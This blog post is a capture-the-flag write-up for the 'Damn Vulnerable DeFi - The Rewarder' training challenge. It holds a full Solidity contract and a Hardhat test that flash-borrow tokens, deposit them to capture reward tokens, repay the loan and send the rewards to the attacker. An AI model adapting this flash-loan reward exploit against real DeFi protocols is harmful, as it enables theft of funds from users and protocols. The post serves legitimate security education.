---
layout: post
date:   2022-08-17 12:59:00 -0500
categories: DeFi flashloan
title: Damn Vulnerable DeFi - The Rewarder
---

## Analysis
Need to understand the relationship between the tokens and the pools. 

`FlashLoanerPool` allows flashloaning of the `DamnValuableToken` but to smart contracts not users
`AccountingToken` is pegged to the `DamnValuableToken`
`TheRewarderPool` rewards any depositor every 5 days proportional to their deposits. It accepts `DamnValuableToken`
`RewardToken` This is the token used to reward depositors.

## Problem
The flash loan tokens can be used to claim rewards

## Exploit

- ExploitTheRewarder.sol

```sol
// ExploitTheRewarder.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";


contract ExploitTheRewarder {
    using Address for address payable;

    // Receiver needs to know the pool it is receiving from
    FlashLoanerPool private immutable pool;
    DamnValuableToken private immutable dvt;
    TheRewarderPool private immutable rewarder;
    RewardToken private immutable rewardtoken;

    // attacker
    address private immutable owner;

    constructor(address payable dvtAddress,
                address payable poolAddress,
                address payable rewarderAddress,
                address payable reward) {
        pool = FlashLoanerPool(poolAddress);
        dvt = DamnValuableToken(dvtAddress);
        rewarder = TheRewarderPool(rewarderAddress);
        rewardtoken = RewardToken(reward);
        owner = msg.sender;
    }

    function exploit() public payable {

        require(msg.sender == owner);

        // interact with the pool, calling the flashLoan will cause
        // the receiveFlashloan routine to be invoked
        pool.flashLoan(1000000 ether);

    }

    function receiveFlashLoan(uint256 amount) public payable {
        // make a deposit of the received funds to trigger receiving of rewards token
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        // withdraw the tokens from rewards
        rewarder.withdraw(amount);
        // and return it to the pool
        dvt.transfer(address(pool), amount);       
        uint256 reward_amount = rewardtoken.balanceOf(address(this));
        // transfer the received rewards to attacker EOA from attacker contract
        rewardtoken.transfer(owner, reward_amount);
    }
}
```

```js
...
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const ExploitTheRewarderFactory = await ethers.getContractFactory("ExploitTheRewarder",
         attacker);
        const ExploitTheRewarder = await ExploitTheRewarderFactory.deploy(
            this.liquidityToken.address,
            this.flashLoanPool.address,
            this.rewarderPool.address,
            this.rewardToken.address);

        // wait 5 days so that contributing will trigger rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 day
        
        // connect to the exploit contract and trigger the exploit
        ExploitTheRewarder.connect(attacker).exploit();

    });
...
```

## Explanation
1. Borrow all the DVT tokens from the flashpool using a smartcontract owned by attacker
2. Deposit them and receive rewards to the attacker smartcontract
3. Since the objective of the task is to claim rewards for the attacker, transfer the received rewards from the attacker smart contract
4. Withdraw the deposited DVT tokens and return them to the flashpool.